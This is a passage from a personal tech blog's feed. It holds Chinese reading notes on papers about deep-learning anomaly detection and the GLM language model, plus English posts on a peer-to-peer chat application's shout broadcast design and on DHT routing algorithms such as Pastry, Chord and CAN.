title="Paragraph"></a>Paragraph</h2><ul><li><p>由于异常检测问题本身的特质导致的复杂性：</p><ul><li>未知性</li><li>异常与异常之间就有着不同的特征</li><li>异常样本数量极少导致的黑白样本比例极不均衡</li><li>异常类型的多种多样<ul><li>点异常</li><li>条件异常</li><li>组异常</li></ul></li></ul></li><li><p>深度学习异常检测面临的挑战</p><ul><li>CH1：低recall rate（样本中的正例多少被预测正确， TP&#x2F;TP+FN）</li><li>CH2：面对高维数据或者相互不独立数据表现一般，如何降维以及降维后如何保证原有信息完整也是挑战</li><li>CH3：由于数据量的有限，如何提高数据使用的有效性。监督学习需要大量的有标签数据，非监督学习依赖于对于异常分布的正确假设，半监督学习是一种解决方向。另一种解决方向是<code>weakly-supervised anomaly detection</code></li><li>CH4：许多弱监督&#x2F;半监督算法抗噪能力不好</li><li>CH5：现有很多异常检测算法均针对点异常，面对上下文异常及组异常效果不好</li><li>CH6：模型可解释性不强，面对某些争议难以合理解释<center>  <img src="/img/DLforAD/1.png" width="800"></center></li></ul></li><li><p>深度学习异常检测方法分类</p><center>  <img src="/img/DLforAD/2.png" width="850"></center></li><li><p>深度学习特征提取</p><ul><li>直接运用流行的深度学习模型AlexNet【1】，VGG【2】，ResNet【4】等提取低维度特征</li><li>训练深度学习特征提取模型进行异常分数评估</li></ul></li><li><p>正常样本表示</p><ul><li>通用正常特征学习，优化通用样本数据特征表示方法<ul><li>Autoencoder（AE）</li><li>GAN-based 异常检测</li><li>基于预测模型的特征学习方法，用之前的数据实例预测现在的数据实例</li><li>自监督学习</li></ul></li><li>针对存在的已知异常特殊优化的异常评估模型<ul><li>基于距离的评估手段</li><li>针对单类型的异常分类器</li><li>基于聚类的评估手段</li></ul></li><li>端到端异常评分学习 - 不仅仅局限于已知异常，着重于基于深度神经网络直接学习评估异常分数<ul><li>排名模型<ul><li>设计基于逻辑回归损失函数的异常评分模型【5】</li><li>先验模型：已知数据集的分布特性</li></ul></li><li>概率模型 - 通过最大化在训练集中事件的可能性来学习异常评分</li><li>端到端单种类分类器<ul><li>对抗学习单种类分类器（adversarially learned one-class classification，ALOCC）【6】</li></ul></li></ul></li></ul></li></ul><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>异常检测方法根据检测环境的不同有比较大的差距。理想情况下需要先了解实际环境中的异常种类、分布等信息，然后对症下药，选择合适的特征工程以及检测算法。但是大多数情况下均不满足这些条件，给检测工作带来许多难题，最终导致模型检测结果不尽如人意。</li><li>深度学习可以针对性的解决部分异常检测面临的挑战，但是也需要针对具体问题灵活选择合适算法。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#3e5880a9bd784529ad5022b751a168ba">Alex Krizhevsky, Ilya Sutskever, and Geoffrey E Hinton. 2012. Imagenet classification with deep convolutional neural networks.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#a854d669d0e74fcf9241cdbab8d2ba3f">Karen Simonyan and Andrew Zisserman. 2015. Very deep convolutional networks for large-scale image recognition. In ICLR.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#c42b25debe154c99ac44769a22218463">Radu Tudor Ionescu, Sorina Smeureanu, Bogdan Alexe, and Marius Popescu. 2017. Unmasking the abnormal events in video. In ICCV. 2895–2903.</a></li><li><a href="https://openaccess.thecvf.com/content_cvpr_2016/html/He_Deep_Residual_Learning_CVPR_2016_paper.html">Kaiming He, Xiangyu Zhang, Shaoqing Ren, and Jian Sun. 2016. Deep residual learning for image recognition. In CVPR. 770–778.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#b46593aa01974e8aa73a0f89fba37aca">Guansong Pang, Cheng Yan, Chunhua Shen, Anton van den Hengel, and Xiao Bai. 2020. Self-trained Deep Ordinal Regression for End-to-End Video Anomaly Detection. In CVPR. 12173–12182.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#9075f53359e1410bbd44f59325c117de">Mohammad Sabokrou, Mohammad Khalooei, Mahmood Fathy, and Ehsan Adeli. 2018. Adversarially learned one-class classifier for novelty detection. In CVPR. 3379–3388.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#78435f94252346e1b2e1295acb851f75">Guansong Pang, Chunhua Shen, Huidong Jin, and Anton van den Hengel. 2019. Deep Weakly-supervised Anomaly Detection. arXiv preprint:1910.13601 (2019).</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li>算法列表<center>  <img src="/img/DLforAD/3.png" width="850"></center><center>  <img src="/img/DLforAD/4.png" width="850"></center></li><li><a href="https://git.io/JTs93">数据集列表</a><center>  <img src="/img/DLforAD/5.png" width="850"></center></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：Deep Learning for Anomaly Detection: A Review&lt;/li&gt;
&lt;li&gt;作者：&lt;ul&gt;
&lt;li&gt;GUANSONG PANG, University of Adelaide&lt;/li&gt;
&lt;li&gt;CHUNHUA SHEN, University of Adelaide&lt;/li&gt;
&lt;li&gt;LONGBING CAO, University of Technology Sydney&lt;/li&gt;
&lt;li&gt;ANTON VAN DEN HENGEL, University of Adelaide&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://arxiv.org/abs/2007.02500&quot;&gt;arxiv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="Anomaly Detection" scheme="https://coldwave96.github.io/tags/Anomaly-Detection/"/>
    
    <category term="Deep Learning" scheme="https://coldwave96.github.io/tags/Deep-Learning/"/>
    
  </entry>
  
  <entry>
    <title>GLM - General Language Model Pre-training with Autoregressive Blank Infilling</title>
    <link href="https://coldwave96.github.io/2023/03/21/GLM/"/>
    <id>https://coldwave96.github.io/2023/03/21/GLM/</id>
    <published>2023-03-21T05:33:44.000Z</published>
    <updated>2023-03-21T05:33:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：GLM: General Language Model Pre-training with Autoregressive Blank Infilling</li><li>作者：<ul><li>Zhengxiao Du：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Yujie Qian：MIT CSAIL</li><li>Xiao Liu：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Ming Ding：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Jiezhong Qi：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Zhilin Yang：Tsinghua University，Shanghai Qi Zhi Institute</li><li>Jie Tang：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li></ul></li><li>原文链接：<a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#56fecaacdf6049f9bdb25e7edacb7f11">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>现有的预训练框架无法灵活的应对所有NLP任务，本文提出基于自回归 + 空白填充（blank infilling）的预训练模型GLM（General Language Model）应对NLU（Natural Language Understanding）任务以及文本生成任务。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>结合AR（autoregressive）模型和空白填充（blank infilling）技术，提出GLM预训练框架应对NLU和长文本生成为主的多种NLP任务。</li><li>在原来空白填充基础上提出了两个创新，span shuffling 和 2D positional encoding。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><h3 id="Sec-1"><a href="#Sec-1" class="headerlink" title="Sec.1"></a>Sec.1</h3><ul><li>现有的预训练框架可以分为三类<ul><li>自回归（autoregressive）模型：如GPT[1]，在长文本生成方面很成功，但是无法完全捕捉上下文之间的依赖关系。</li><li>自编码（autoencoding）模型：如BERT[2]，适合NLP任务，但是不能直接应用于文本生成。</li><li>编码器-解码器模型：如T5[3]，统一了NLU和条件生成，但是需要更多的参数匹配基于BERT模型的性能表现。</li></ul></li></ul><h3 id="Sec-2"><a href="#Sec-2" class="headerlink" title="Sec.2"></a>Sec.2</h3><ul><li>GLM 预训练：输入的部分被分为两个部分。A部分是被破坏的文本<code>Xcorrupt</code>，B部分为被sample的部分。B部分中每个span前后分别加上[S]和[E]，训练目标是预测B部分。使用两种位置向量作为输入。Self-attention的mask部分控制attend的位置，蓝色部分即A部分只能attend本身，黄色和绿色部分也即B部分能attend整个A部分以及前面已经生成的部分。</li></ul><center>    <img src="/img/GLM/1.png" width="850"></center><ul><li>多任务预训练：<ul><li>文档级：对单一span取样，长度为原长度均匀分布中的50% - 100%。这一部分旨在长文本生成。</li><li>句子级：限制被mask的span必须是完整句子，取样覆盖15%的原始tokens。这部分旨在预测完成句子和段落的seq2seq任务。</li></ul></li><li>GLM使用的是单一Transformer以及一些改进<ul><li>重新排列了层的归一化和残差连接的顺序。</li><li>使用单一的线性层用于输出token的预测。</li><li>用GeLUs替代ReLU作为激活函数[4]。</li></ul></li><li>2D Positional Encoding： 每一个token由两个位置编码组成<ul><li>第一个位置编码为token在<code>Xcorrucpt</code>中的位置。被mask的token为【MASK】标志的位置。</li><li>第二个位置编码代表其在intra-span中的位置。Part A的token该位置编码为0， Part B的token该位置编码从1到span的长度。</li></ul></li></ul><h3 id="Sec-3"><a href="#Sec-3" class="headerlink" title="Sec.3"></a>Sec.3</h3><ul><li>Finetuning GLM（调优）<ul><li>分类任务（NLU）：参考PET[5]，对于带标签的例子（x，y），将输入 x 转化成为一个包含单一【MASK】的填空题，预测标签 y 映射到这个填空题的答案集中。通过交叉熵（cross-entropy loss）来微调模型。</li><li>文本生成任务：给定的上下文构成输入的A部分，在结尾append一个【MASK】token，以autoregressive模型生成B部分。</li></ul></li></ul><center>    <img src="/img/GLM/2.png" width="850"></center><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>提出了改进型的GLM模型旨在同时适配NLU和长文本生成任务，结合了span shuffling 和 2D positional encoding两处创新。</li><li>分类任务介绍不够详细，详细方法可能需要通过代码实现来佐证。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#5e97f05c3c594f6a8b239acb9463c25b">Alec Radford, Karthik Narasimhan, Tim Salimans, and Ilya Sutskever. 2018a. Improving Language Understanding by Generative Pre-Training.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#c3092c7d95cc4d07b2d8d8abf33b1a84">Jacob Devlin, Ming-Wei Chang, Kenton Lee, and Kristina Toutanova. 2019. BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. In NAACL 2019, pages 4171–4186.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#1769f3f516414bfa8b6037fe43f2cefc">Colin Raffel, Noam Shazeer, Adam Roberts, Katherine Lee, Sharan Narang, Michael Matena, Yanqi Zhou, Wei Li, and Peter J. Liu. 2020. Exploring the Limits of Transfer Learning with a Unified Text-toText Transformer. J. Mach. Learn. Res., 21:140:1140:67.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#72b2defebc20404aa27ff0bdd290763a">Dan Hendrycks and Kevin Gimpel. 2016. Bridging nonlinearities and stochastic regularizers with gaussian error linear units. CoRR, abs&#x2F;1606.08415.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#36a58dc3ea30420c9d91627385988a72">Timo Schick and Hinrich Schütze. 2020a. Exploiting Cloze Questions for Few Shot Text Classification and Natural Language Inference. pages 255–269.</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li><a href="https://github.com/THUDM/GLM">GLM</a></li><li><a href="https://github.com/THUDM/ChatGLM-6B">GLM-6B</a></li><li><a href="https://github.com/THUDM/GLM-130B">GLM-130B</a></li><li>Cloze questions and verbalizers</li></ul><center>    <img src="/img/GLM/3.png" width="850"></center>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：GLM: General Language Model Pre-training with Autoregressive Blank Infilling&lt;/li&gt;
&lt;li&gt;作者：&lt;ul&gt;
&lt;li&gt;Zhengxiao Du：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Yujie Qian：MIT CSAIL&lt;/li&gt;
&lt;li&gt;Xiao Liu：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Ming Ding：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Jiezhong Qi：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;li&gt;Zhilin Yang：Tsinghua University，Shanghai Qi Zhi Institute&lt;/li&gt;
&lt;li&gt;Jie Tang：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#56fecaacdf6049f9bdb25e7edacb7f11&quot;&gt;arxiv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>A Decentralized Chat Application</title>
    <link href="https://coldwave96.github.io/2021/11/02/P2PChatSystem/"/>
    <id>https://coldwave96.github.io/2021/11/02/P2PChatSystem/</id>
    <published>2021-11-02T06:28:03.000Z</published>
    <updated>2021-11-02T06:28:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>The project is to transform existing chat program into a decentralized chat application.</p><span id="more"></span><h2 id="Discussion-About-the-Shout-Feature"><a href="#Discussion-About-the-Shout-Feature" class="headerlink" title="Discussion About the Shout Feature"></a>Discussion About the Shout Feature</h2><p>The shout command can be used by any user currently joined in a room. Once a peer shouted, all peers in the network includes all peers for which there is a path of connections from shouting peer are supposed to receive a provided message.</p><h3 id="Overall-Design"><a href="#Overall-Design" class="headerlink" title="Overall Design"></a>Overall Design</h3><p>Assume that we have established a peer network as shown in Figure 1. Peer C and peer D are connected to peer B. Peer B is connected to peer A. At a certain time, peer C types a shout command and then sends a Shout Command I to its upstream node peer B. After received the Shout Command I from its downstream node, peer B will send Shout Message to all the downstream nodes that connected to it. Also, peer B will check if it is connecting to other peers. If peer B does connect to another peer as shown in the figure, it will send a Shout Command II to its upstream node.  Then the peer A, as the upstream node of peer B, will do the same thing that is sending Shout Messages to its downstream nodes and Shout Command II to its upstream nodes. In this way, the broadcast of shout messages is achieved.</p><p>This is a brief overall design on Shout feature. The content and format of the command packet and message packet which involve in have been illustrated in the Figure 1.</p><p><img src="/img/P2PChatSystem/Picture1.png" alt="Figure 1"></p><h3 id="Implementation-Details"><a href="#Implementation-Details" class="headerlink" title="Implementation Details"></a>Implementation Details</h3><p>This part focus on the implementation details about the Shout feature. In this project, we are supposed to combine the server part and the client part into one peer. Therefore, I use two threads to handle the different parts separately.</p><p><img src="/img/P2PChatSystem/Picture2.png" alt="Figure 2"></p><p>For the first step, when a peer wants to shout, it will send Shout Command I to its upstream peer through client handle thread. When upstream node’s server thread received a Shout Command, it will first check if there is an identity field in the command packet to distinguish the command’s type. If it’s a Shout Command I, it means that one of the peers connected to the peer wants to shout. Then for the second step, the peer will find the identity of the shout peer and send Shout Message containing the identity of the shout peer to all peers connected to the current peer and joining a room. At the same time, server handle thread will check if the client handle thread is connecting to another peer other than itself. If it does connect to another peer, then the client handle thread will send a Shout Message II containing the identity of shout peer to the upstream peer.</p><p>When a peer received a Shout Message from its upstream peer, there are two things to do. First, the client handle thread will print the shout message on the screen. Second, the peer will send the Shout Message to all the peers that connected to it and joined a room. When a peer received a Shout Command II, there are also two things to do. First, the peer will send Shout Messages filled with the information from the Shout Command II to all the peers which connected to the current peer and joined a room. Second, the peer will check if it is connected to another peer other than itself. If it is connecting to another peer, then it will retweet this Shout Message II to that peer. So on and so forth, the Shout Message can be broadcast through the peer-to-peer network.</p><h3 id="Discussion-About-the-Shout-Feature-Implementation"><a href="#Discussion-About-the-Shout-Feature-Implementation" class="headerlink" title="Discussion About the Shout Feature Implementation"></a>Discussion About the Shout Feature Implementation</h3><p>In the previous description, I introduced the implementation of Shout feature. Overall, this implementation has its cons and pros when facing the general challenges of distributed system.</p><p>For scalability, the bottleneck is performance of the peer. Each peer needs at least two threads to handle the client and server side respectively. If the client uses the #connect command to connect to another peer, an additional thread is needed to receive message from the upstream peer’s server thread in real time. In addition, whenever a new peer connects to the current peer, the server thread creates a new thread to handle the keep-alive socket connect. So, this is where the paradox comes in. The use of threads allows us to easily scale the peer-to-peer network and at the same time becomes a bottleneck that limits the size of the network.</p><p>For concurrency, also threads help the system to control multiple processes with its unique competitive mechanism. The system meets the demand of high concurrency to a certain extent by combing multi-threaded technology with the multi-core and multi-threaded feature of CPU. This allows the system to perform several tasks simultaneously, improving operational efficiency and speeding up data processing. Data consistency is also ensured by lock or message queue techniques.<br>For failure handling, the implementation has many shortcomings. Only the simplest case is presented in the design and implementation, but the actual situation can be very complex. First of all, if a Shout Message or Shout Command is lost during transmission, then starting from the lost peer, subsequent peers will not receive the Shout Message or Command, and there is no means to detect the loss of the packet. Another problem is that if there is a cycle path among the peer-to-peer network, the broadcast of Shout Message will be no end.</p><p><img src="/img/P2PChatSystem/Picture3.png" alt="Figure 3"></p><p>First consider a simple loop as shown in the Figure 3, which is a peer connected to itself. In such case, if the peer received a Shout Command I, it is supposed to send a Shout Command II to itself. This leads to an infinite loop. So, the system will check if the current peer is connected to itself, then decide whether it is necessary to send the Shout Command II packet.</p><p>When considering another slightly more complex loop as shown in the Figure 3-4, this broadcast loop issue will be difficult to solve. Peer A sends Shout Command I to peer C, peer C responses with Shout Message and sends the Shout Message to peer B. Also, peer C sends Shout Command II to peer D. In the meanwhile, peer D sends Shout Command II to peer A. After peer A receives the Shout Command II from peer D, it will transfer this Shout Command II to peer C. And so, the cycle continues endlessly.</p><p><img src="/img/P2PChatSystem/Picture4.png" alt="Figure 4"></p><p>For security, there are several security issues in the implementation. First, all the packets are not encrypted, hackers could easily get some information through listening the communication channel. Second, hackers could hijack the packet, modify the content, and replay the new packet. Finally, hackers could create multiple peers and shout at a same time. The broadcast message may greatly increase the network load, and even crash the network.</p><h2 id="Discussion-About-the-Decentralized-Model"><a href="#Discussion-About-the-Decentralized-Model" class="headerlink" title="Discussion About the Decentralized Model"></a>Discussion About the Decentralized Model</h2><p>As discussed before, the peer will create two threads initially. The server thread is waiting for other peers’ socket connection and the client thread is used for handling user commands.</p><p>User could use #help command to get some help. The system will list all available commands. Only the peer owner could use #createroom command to create a new chat room on the current peer. User could use #list command to list all the chat room on the current peer. #who command is used for list all the members in a chat room. The peer owner could use #kick command to kick a peer from the current peer and the system will add its IP into blacklist. Therefore, the kicked peer is blocked from reconnecting. User could user #delete command to delete a room from current peer. #listneighbors command is used for listing the neighbors of current peer. #searchnetwork command will crawl over all the accessible peer in the peer-to-peer network automatically. User could use #quit command to quit the system.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;The project is to transform existing chat program into a decentralized chat application.&lt;/p&gt;</summary>
    
    
    
    <category term="Program" scheme="https://coldwave96.github.io/categories/Program/"/>
    
    <category term="Java" scheme="https://coldwave96.github.io/categories/Program/Java/"/>
    
    
    <category term="Github" scheme="https://coldwave96.github.io/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>Routing in P2P Overlay Networks</title>
    <link href="https://coldwave96.github.io/2021/09/17/RoutingInP2P/"/>
    <id>https://coldwave96.github.io/2021/09/17/RoutingInP2P/</id>
    <published>2021-09-17T10:53:07.000Z</published>
    <updated>2021-09-17T10:53:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>[Abstract] P2P (Peer-to-Peer) overlay network is one of the most popular distributed networks. It not only has advantages in scalability, but also can maximize the use of computing and storage resources of each terminal nodes. In the last ten years, P2P system is a hot topic in IT field. Recently, most researchers study structed P2P system, which is better than the former P2P structure. This paper focus on the routing algorithms based on DHT in second generation of P2P overlay networks.</p><span id="more"></span><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>The emergence of P2P system is the consequence of the rapid development of Internet. The world’s population is increasing, and technology is also improving. The demand for Internet services is also expanding. Traditional network can only expand its service scope by increasing the number of servers, while the purchase and maintenance of servers will increase the costs of service providers and consume a lot of resources. In addition, the single server needs to extend the network bandwidth to expand the number of services. This is also one of the limiting factors in the traditional network itself. </p><p>Peer-to-Peer system is an instance of distributed system. Unlike traditional network architecture, there is no concept of centralized control in P2P system. In other words, each terminal node in this type of network is both the service provider and user. Peer-to-peer systems aim to support useful distributed services and applications using data and computing resources available in the personal computers and workstations that are present on the Internet and other networks in ever-increasing numbers [1].</p><p>In the P2P system, resources are stored in the nodes of the network. The structured overlay network is responsible for routing between any two P2P nodes. In the first generation of structured overlay network algorithms, each node records all other nodes’ pointer (one hop overlay), so that most of the message communication can be completed directly. These algorithms are suitable for small scale networks. In the second generation of structured overlay network algorithms, each node only records a small number of pointers of other nodes. The algorithms ensure that the message routing is completed within a certain number of hops. Typical algorithms such as Chord, Pastry, Tapestry and CAN. This paper mainly introduces the second generation of structured overlay network algorithm, then analyzes and compares its performance.</p><h2 id="2-Routing-Overlays"><a href="#2-Routing-Overlays" class="headerlink" title="2.Routing Overlays"></a>2.Routing Overlays</h2><p>Routing overlay is a distributed algorithm in P2P system which takes responsibility for locating nodes and objects. Peer-to-peer systems usually store multiple replicas of objects to ensure availability. In that case, the routing overlay maintains knowledge of the location of all the available replicas and delivers requests to the nearest ‘live’ node (i.e., one that has not failed) that has a copy of the relevant object [1].</p><h3 id="2-1-DHT"><a href="#2-1-DHT" class="headerlink" title="2.1.DHT"></a>2.1.DHT</h3><p>In P2P overlay networks, each object has unique GUID (Globally Unique Identifier). This value is calculated by a hash function (such as SHA-1) according to all or part of the state of the object. Because of this, routing overlay networks are sometimes called distributed hash tables (DHT).</p><p>In DHT model, a data item with a GUID of X will be stored in a node whose GUID is closest to X in value. Copies of the data item will also be stored on R hosts. The GUID of these hosts is last close to X, and R is the replication factor to ensure high availability.</p><p>The GUIDs cannot be read artificially, so you must get the object’s GUID through some indexing services. Then, the P2P system will find the location of these objects in the overlay networks through the following routing algorithms.</p><h3 id="2-2-Pastry"><a href="#2-2-Pastry" class="headerlink" title="2.2.Pastry"></a>2.2.Pastry</h3><p>Pastry is a network structure using DOLR (Distributed Object Location and Routing) technology. Messages are routed according to the keywords provided. In pastry, each node is assigned a 128 bits ID which is generated by the unified hash function according to the IP address or public host name of the node.</p><p>Each node has a routing table, a set of neighboring nodes and a set of leaf nodes. The IP address of the node is included in the routing table, and the first n bits of the ID of these nodes are the same, where n is the number of rows of the entry in the routing table. The IP addresses listed in the neighbor node set, and the corresponding IDs of these nodes are very similar to those of the nodes with the routing table. The ID of the node in the leaf node set is smaller than that of the node. Both routing table and leaf node set are used to route messages, but neighbor node set is only used to keep nodes locatable. When a node receives a message that it should route, it first checks the leaf node set, followed by the routing table. With the progress of routing, the ID gradually approaches the ID of the target node, and finally the message arrives at the target node.</p><h3 id="2-3-Tapestry"><a href="#2-3-Tapestry" class="headerlink" title="2.3.Tapestry"></a>2.3.Tapestry</h3><p>Tapestry is another network structure using DOLR technology. Each tapestry node contains pointers to other nodes and maps between the object’s GUID and node ID. Queries are routed along nodes of adjacent links until appropriate object pointers are found.</p><p>Tapestry network is a multi-node overlay network. Each tapestry node contains links to the set of neighbors with the shared node ID prefix. The neighbor nodes of a node constitute the neighbor node set. All the sets come together to form a routing table. When you want a node to publish an object, a mapping message will be sent to the target node whose node ID is closest to the object ID. When a node searches for an object, it is not necessary to find the target node that is close to or matches the object. It is only necessary to find the node that has the location information of the object.</p><h3 id="2-4-Chord"><a href="#2-4-Chord" class="headerlink" title="2.4.Chord"></a>2.4.Chord</h3><p>Chord algorithm is very simple. It uses a keyword to identify the file and stores the file on the node corresponding to the keyword. Chord stores keywords on the corresponding nodes in chord by using the consistent hash function. Each node in chord only needs to know the routing messages of a few other nodes. This is because the routing table in chord is decentralized, and each node gets path information by communicating with a few other nodes.</p><h3 id="2-5-CAN"><a href="#2-5-CAN" class="headerlink" title="2.5.CAN"></a>2.5.CAN</h3><p>CAN (Content-Addressable Network) is also a network structure that maps keywords to nodes. CAN uses multidimensional identifier space to implement DHT algorithm. CAN maps all nodes into an n-dimensional Cartesian space and allocates a region to each node as evenly as possible. CAN uses hash function to hash the K in (K, V) pair to get a point in Cartesian space, and stores the (K, V) pair in the node which has the region of the point. The routing algorithm adopted by CAN is relatively direct and simple. After finding out the coordinates of the target point, it will send the request to the node whose coordinates are closest to the target point.</p><p>Each node in CAN system maintains a routing table, which stores the IP address and coordinate area of adjacent nodes. When looking for messages, the node routes the lookup message to the neighbor node closest to the coordinate of the target node.</p><h2 id="3-Comparison"><a href="#3-Comparison" class="headerlink" title="3.Comparison"></a>3.Comparison</h2><p>In this section, the paper will compare overlay networks with traditional networks and different overlay networks algorithms we mentioned in section 2.</p><h3 id="3-1-Comparison-of-Overlay-Networks-and-Traditional-Networks"><a href="#3-1-Comparison-of-Overlay-Networks-and-Traditional-Networks" class="headerlink" title="3.1.Comparison of Overlay Networks and Traditional Networks"></a>3.1.Comparison of Overlay Networks and Traditional Networks</h3><p>When it comes to the traditional network, the first thing to think of is the TCP&#x2F;IP model. First, in terms of scale, the overlay network allows more usable space. Second, the placement of overlay network objects can be randomized, unlike the traditional network traffic model, which is associated with network topology. Thirdly, the update speed of overlay network routing table is much faster than that of traditional network. Fourth, in traditional networks, the target node is usually unique. While in overlay networks, it is enough to find the nearest copy of the target object. Finally, because the biggest characteristic of P2P network is decentralization, it has advantages in security and privacy compared with traditional networks.</p><h3 id="3-2-Comparison-of-Different-Routing-Algorithms-Based-on-DHT"><a href="#3-2-Comparison-of-Different-Routing-Algorithms-Based-on-DHT" class="headerlink" title="3.2.Comparison of Different Routing Algorithms Based on DHT"></a>3.2.Comparison of Different Routing Algorithms Based on DHT</h3><p>Obviously, the management of P2P system based on centralized directory mechanism is simpler. The bandwidth cost of maintaining the network is also smaller. However, because the server needs to centrally manage all the node information of the whole network, the performance and network liaison of the server will become the bottleneck of the whole system. The robustness of distributed P2P system is strengthened, and it will not cause the network paralysis because of the failure of a few nodes. Neither Napster nor Gnutella can ensure that the target node is found through an attempt. Servers in Napster may be paralyzed, and file location failure may occur due to the limit of flooding times in Gnutella. The DHT algorithm of structured coverage network can solve these problems.</p><p>Several algorithms based on DHT are similar in scalability, distribution, load balancing and self-organization. But it is different in some ways. Chord provides a naming mechanism, the consistency problem when nodes join and the treatment when nodes fail are relatively perfect. Chord can be used in large-scale file sharing network, time sharing effective storage system and large-scale distributed computing platform. Chord, Pastry and Tapestry all have the same number of search hops, and the length of CAN search path is relatively longer, so it is not suitable for voice phone and real-time information service. However, due to the good scalability index mechanism of CAN network, it can effectively support content insertion and retrieval.</p><p>The following table comprehensively compares the four algorithms mentioned in this paper from several aspects.</p><table><thead><tr><th align="center">Algorithms</th><th align="center">Insertion complexity</th><th align="center">Spatial complexity</th><th align="center">Average searching hops</th></tr></thead><tbody><tr><td align="center">Pastry</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td></tr><tr><td align="center">Tapestry</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(Nlog<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td></tr><tr><td align="center">Chord</td><td align="center">O(log<sub>2</sub>⁡N)</td><td align="center">O(Nlog<sub>2</sub>⁡N)</td><td 